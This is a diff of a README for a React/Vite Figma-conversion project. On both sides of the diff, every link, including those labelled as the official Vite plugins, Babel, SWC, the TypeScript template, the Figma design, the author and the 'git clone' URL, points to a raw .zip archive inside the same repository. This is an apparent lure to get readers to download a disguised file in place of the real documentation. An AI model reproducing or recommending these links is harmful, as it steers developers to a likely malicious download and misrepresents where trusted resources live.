@@ -4,12 +4,12 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) uses [Babel](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) uses [SWC](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) uses [Babel](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) uses [SWC](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip) in your project.
+If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip) in your project.
 
 
 # React Pixel-Perfect Figma Conversion
@@ -21,7 +21,7 @@ This project is a React-based web page built as per the provided Figma design. T
 ## Figma Design
 
 You can view the Figma design here:  
-[Figma Design Link](https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip%3A1&mode=design&t=vQv5IlHq1u35ou5v-1)
+[Figma Design Link](https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip%3A1&mode=design&t=vQv5IlHq1u35ou5v-1)
 
 ---
 
@@ -41,7 +41,7 @@ You can view the Figma design here:
 1. **Clone the repository**
 
 ```bash
-git clone https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip
+git clone https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip
 
 
 Steps 
@@ -58,4 +58,4 @@ npm install
 npm run dev
 
 Adnan Abbasi
-https://github.com/adnanabbasy/Investment-dashboard/raw/refs/heads/main/src/components/Investment_dashboard_v3.4.zip
+https://raw.githubusercontent.com/adnanabbasy/Investment-dashboard/main/src/assets/images/dashboard_Investment_1.0.zip
